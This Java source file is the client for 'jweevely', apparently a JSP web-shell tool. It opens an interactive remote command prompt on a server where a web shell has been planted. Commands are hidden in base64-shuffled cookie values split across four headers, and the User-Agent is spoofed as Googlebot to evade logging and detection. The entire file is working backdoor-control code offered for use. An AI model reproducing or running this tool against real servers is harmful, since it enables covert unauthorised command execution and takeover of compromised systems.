package jweevely;

import org.apache.http.HeaderElement;
import org.apache.http.HeaderElementIterator;
import org.apache.http.HttpEntity;
import org.apache.http.HttpHeaders;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.message.BasicHeaderElementIterator;
import org.apache.http.util.EntityUtils;
import org.jline.reader.*;
import org.jline.reader.impl.completer.ArgumentCompleter;
import org.jline.reader.impl.completer.NullCompleter;
import org.jline.reader.impl.completer.StringsCompleter;
import org.jline.terminal.Terminal;
import org.jline.terminal.TerminalBuilder;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.URLEncoder;

import static org.jline.builtins.Completers.FileNameCompleter;

/**
 * 2018年 09月 20日 星期四 22:25:13 CST
 * 此项目待重构!
 * 2013年 12月 08日 星期日 22:56:07 CST
 *
 * @author needle wang
 */
public class JweevelyClient {
  public JweevelyClient(UserMesg aUser, String hostname, String cwd) {
    this.builtIn = new BuiltIn(aUser, hostname, cwd);
  }

  public BuiltIn getBuiltIn() {
    return builtIn;
  }

  public LineReader getConsole() throws IOException {
    if (lineReader == null) {
      // jline2
      // lineReader = new ConsoleReader(System.in, System.out);
      // lineReader = new ConsoleReader();
      // jline3
      Terminal terminal = TerminalBuilder.terminal();

      Completer argumentCompleter = new ArgumentCompleter(
          new StringsCompleter(BuiltIn.BUILTIN_FUNCTION),
          new FileNameCompleter(),
          NullCompleter.INSTANCE
      );

      LineReaderBuilder lineReaderBuilder = LineReaderBuilder.builder();
      lineReaderBuilder.appName("jweevely0.4")
                       .completer(argumentCompleter)
                       .option(LineReader.Option.HISTORY_BEEP, false)
                       .terminal(terminal);
      lineReader = lineReaderBuilder.build();
    }

    prompt = "\u001B[33mjweevely\u001B[0m@"
        + builtIn.getHostname() + "\u001B[33m>\u001B[0m ";

    return lineReader;
  }

  public static String oneJweevelyClient(CloseableHttpClient httpclient,
                                         HttpPost httppost, String password, String inputStr, String identify)
      throws IOException {
    // throws ClientProtocolException, IOException {

    populateCookiesValue(httppost, password, inputStr);

    try (CloseableHttpResponse response = httpclient.execute(httppost)) {
      cleanHttpPost(httppost);
      HeaderElementIterator het = new BasicHeaderElementIterator(
          response.headerIterator("Set-Cookie"));
      while (het.hasNext()) {
        HeaderElement elem = het.nextElement();
        // System.out.println(elem.getName() + "----" + elem.getValue());

        if (elem.getName().equals("rlp")) {

          String rlp_value = elem.getValue();

          if (rlp_value != null && !rlp_value.isEmpty()) {

            BuiltIn.setUriAbsolutePath(rlp_value);

            // when first login, print the currentfile and docRoot.
            System.out.println(BuiltIn.CURRENTFILE + "\t"
                + BuiltIn.uriAbsolutePath);
            System.out.println(BuiltIn.DOCROOT + "\t"
                + BuiltIn.doc_root);
            break;
          }
        }
      }
      HttpEntity entity = response.getEntity();
      if (entity != null) {
        // long len = entity.getContentLength();
        // if (len != -1 && len < 2048 * 2) {
        String responseContents = EntityUtils.toString(entity);
        int div_start = responseContents.indexOf("<" + identify + ">")
            + ("<" + identify + ">").length();
        int div_end = responseContents.indexOf("</" + identify + ">");
        if (div_end >= div_start) {
          return responseContents.substring(div_start, div_end);
        }
        return "<" + identify + ">page not return contents.</"
            + identify + ">\n";
        // } else {
        // System.out.println(responseContents);
        // return "contents are too huge.\n";
        // }
      } else {
        return "";
      }
    }
  }

  /**
   * populate sess[0-3]'s cookie.
   *
   * @param httppost HttpPost
   * @param sess0    passwd
   * @param command  command to run
   */
  public static void populateCookiesValue(HttpPost httppost, String sess0,
                                          String command) {
    sess0 = UserMesg.getShuffBase64(sess0).toString();

    StringBuffer cool_cmd = UserMesg.getShuffBase64(command);
    /*
     * System.out.println("-----before removed cookie.-----");
     * HeaderIterator headerIter = httppost.headerIterator();
     * while(headerIter.hasNext()) {
     *   System.out.println(headerIter.next());
     * }
     * System.out.println("-----after removed cookie.------");
     * httppost.removeHeaders("Cookie");
     * headerIter = httppost.headerIterator();
     * while (headerIter.hasNext()) {
     *   System.out.println(headerIter.next());
     * }
     */

    int split = cool_cmd.length() / 3;
    String sess1 = cool_cmd.substring(0, split);
    String sess2 = cool_cmd.substring(split, split * 2);
    String sess3 = cool_cmd.substring(split * 2, cool_cmd.length());

    /*
     * cookie would be truncated '=' in some tomcat6~. so need urlencode.
     */
    try {
      sess0 = URLEncoder.encode(sess0, "UTF-8");
      sess1 = URLEncoder.encode(sess1, "UTF-8");
      sess2 = URLEncoder.encode(sess2, "UTF-8");
      sess3 = URLEncoder.encode(sess3, "UTF-8");
    } catch (UnsupportedEncodingException e) {
      e.printStackTrace();
    }

    httppost.addHeader("Cookie", "sess0=" + sess0);
    httppost.addHeader("Cookie", "sess1=" + sess1);
    httppost.addHeader("Cookie", "sess2=" + sess2);
    httppost.addHeader("Cookie", "sess3=" + sess3);
    /*
     * System.out.println("-----after populate cookie.-----");
     * headerIter = httppost.headerIterator();
     * while (headerIter.hasNext()) {
     * System.out.println(headerIter.next());
     * }
     */
  }

  /**
   * clean httppost's data content after received a response, as for next
   * repost. if not, the previous post mesg would disturb next post.
   *
   * @param httppost HttpPost
   */
  public static void cleanHttpPost(HttpPost httppost) {

    httppost.removeHeaders("Cookie");
    httppost.setEntity(null);
  }

  public String getPrompt() {
    return prompt;
  }

  private BuiltIn builtIn;
  private LineReader lineReader;
  private String prompt;

  public static void main(String[] args) {
    // public static void main(String[] args) throws URISyntaxException, ClientProtocolException, IOException {
    if (args == null || args.length != 2) {
      System.out.println("usage:\njava -jar jweevely.jar url password");
      return;
    }

    UserMesg aUser = new UserMesg(args[1]);

    String password = aUser.getPassword();
    CloseableHttpClient httpclient = aUser.getHttpclient();
    String pa_identify = aUser.getPa_identify();

    // URI uri = new URIBuilder().setScheme("http").setHost("127.0.0.1")
    // .setPort(8080).setPath("/jweevely/index.jsp").build();
    URI uri;
    try {
      uri = new URI(args[0]);
    } catch (URISyntaxException e) {
      System.out.println(e.getMessage());
      return;
    }
    HttpPost httppost = new HttpPost(uri);
    httppost.addHeader(HttpHeaders.USER_AGENT,
        "Mozilla/5.0 (compatible; Googlebot/2.1; http://www.google.com/bot.html)");

    String hostname;
    try {
      // get hostname. replace the last \n!!
      hostname = oneJweevelyClient(httpclient, httppost, password,
          "hostname", pa_identify);
    } catch (IOException e) {
      System.out.println(e.getMessage());
      return;
    }
    hostname = hostname.replaceAll("\n", "");

    // System.out.println(BuiltIn.useage());

    if (hostname.contains("<" + pa_identify + ">")) {
      System.err.println("[Error] can't get a connecting:\n"
          + "  bad password or unable to run hostname.");
      return;
    }

    System.out.println("for help? just type :help");

    // judge the remote host's OS.
    String osName = "linux";
    String pwd_command = "pwd";
    if (hostname.contains("\r")) {
      hostname = hostname.replaceAll("\r", "");
      pwd_command = "echo %cd%";
      osName = "windows";
    }

    String cwd;
    try {
      // get cwd. replace the last \n!!
      cwd = oneJweevelyClient(httpclient, httppost, password,
          pwd_command, pa_identify);
    } catch (IOException e) {
      System.out.println(e.getMessage());
      return;
    }
    cwd = cwd.replaceAll("[\r\n]", "");

    JweevelyClient connector = new JweevelyClient(aUser, hostname, cwd);
    BuiltIn builtIn = connector.getBuiltIn();
    builtIn.setRemoteOsName(osName);

    // jdk1.5
    // Scanner scanner = new Scanner(System.in);
    // while (scanner.hasNextLine()) {
    // jdk1.6
    // System.out.println("jdk6's great lineReader, what a greedy poor...");
    // Console lineReader = System.lineReader();
    // if (lineReader == null) {
    // throw new IllegalStateException("must in a terminal.");
    // }
    // jline2.1
    // It would read chinese word wrong in win without System.in.
    // use jline3
    LineReader reader;
    try {
      reader = connector.getConsole();
    } catch (IOException e) {
      System.out.println(e.getMessage());
      return;
    }

    String inputStr;
    try {
      while ((inputStr = reader.readLine(connector.getPrompt())) != null) {
        // jdk1.5
        // String inputStr = scanner.nextLine();
        // jdk1.6
        // String inputStr = lineReader.readLine("jweevely> ");
        // must be existed.
        if (inputStr.length() == 0) {
          continue;
        }

        // if the command in built-in.
        inputStr = builtIn.validateIsBuiltIn(httppost, inputStr);
        // some BuiltIn's cmds don't use exec.
        if (inputStr == null || inputStr.length() == 0) {
          continue;
        }

        inputStr = builtIn.validateIsCd(inputStr);
        // for debug, here is the final mesg sent to the remote host.
        System.out.println("inputStr is: '" + inputStr + "'");

        inputStr = BuiltIn.toUnicodePartly(inputStr);

        String result = oneJweevelyClient(httpclient, httppost, password,
            inputStr, pa_identify);

        System.out.print(result);

        // need exit code, I don't wanna do it...
        if ((result.contains("bash:") && result.contains("cd"))
            || (result.contains("系统找不到指定的路径"))) {
          builtIn.setCwd(builtIn.getLast_cwd());
        }
      }
    } catch (UserInterruptException | EndOfFileException ignored) {
    } catch (IOException e) {
      System.out.println(e.getMessage());
    }
  }
}
